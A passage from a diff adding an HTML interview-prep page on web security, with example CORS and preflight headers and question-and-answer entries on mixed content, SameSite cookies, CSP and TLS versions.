+has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present 
+on the requested resource.
+
+// Solution: Server must send CORS headers
+Access-Control-Allow-Origin: https://mysite.com
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Allow-Credentials: true  // If sending cookies</pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-title">Preflight Request (OPTIONS)</div>
+        <pre>
+// For "complex" requests, browser sends preflight OPTIONS request first
+// Check Network panel for OPTIONS request before actual request
+
+// Request headers (automatic)
+OPTIONS /api/data HTTP/1.1
+Origin: https://mysite.com
+Access-Control-Request-Method: POST
+Access-Control-Request-Headers: Content-Type, Authorization
+
+// Server must respond with:
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: https://mysite.com
+Access-Control-Allow-Methods: POST, GET, OPTIONS
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Max-Age: 86400  // Cache preflight for 24 hours</pre>
+      </div>
+
+      <div class="warning">CORS is one of the most common interview topics! Know simple vs. preflighted requests, and what headers are needed.</div>
+    </section>
+
+    <!-- Interview Questions -->
+    <section>
+      <h2>🎯 Interview Questions - Security</h2>
+
+      <div class="concept-box">
+        <h4>Q1: What is mixed content and why is it dangerous?</h4>
+        <p><strong>Answer:</strong> Mixed content is when an HTTPS page loads resources over HTTP. It's dangerous because HTTP resources can be intercepted and modified by attackers (MITM), compromising the security of the entire page. Active mixed content (scripts, iframes) is blocked by browsers; passive (images) shows warnings.</p>
+      </div>
+
+      <div class="concept-box">
+        <h4>Q2: Explain the SameSite cookie attribute.</h4>
+        <p><strong>Answer:</strong> SameSite controls when cookies are sent with cross-site requests. Strict: never sent cross-site. Lax: sent with top-level navigation only. None: always sent (requires Secure). It's the primary defense against CSRF attacks. Lax is the default in modern browsers.</p>
+      </div>
+
+      <div class="concept-box">
+        <h4>Q3: What is CSP and how does it prevent XSS?</h4>
+        <p><strong>Answer:</strong> Content Security Policy is an HTTP header that tells the browser which sources can load resources. It prevents XSS by blocking unauthorized scripts. Key directives: script-src, default-src, etc. Using nonces or hashes with 'strict-dynamic' is the recommended approach.</p>
+      </div>
+
+      <div class="concept-box">
+        <h4>Q4: What's the difference between TLS 1.2 and TLS 1.3?</h4>
+        <p><strong>Answer:</strong> TLS 1.3 is faster (1-RTT vs 2-RTT handshake), more secure (removed weak algorithms), supports 0-RTT resumption, and requires forward secrecy. It's the recommended standard; TLS 1.2 is acceptable but 1.1 and below are deprecated.</p>
+      </div>
+
+      <div class="concept-box">
+        <h4>Q5: How do you debug CORS errors?</h4>
+        <p><strong>Answer:</strong> Check Network panel for the failed request and any preflight OPTIONS request. Look at response headers for Access-Control-Allow-Origin, Methods, and Headers. The error in Console indicates what's missing. Server must explicitly allow the requesting origin.</p>
+      </div>
+    </section>
+
+  </div>
+</body>
+</html>
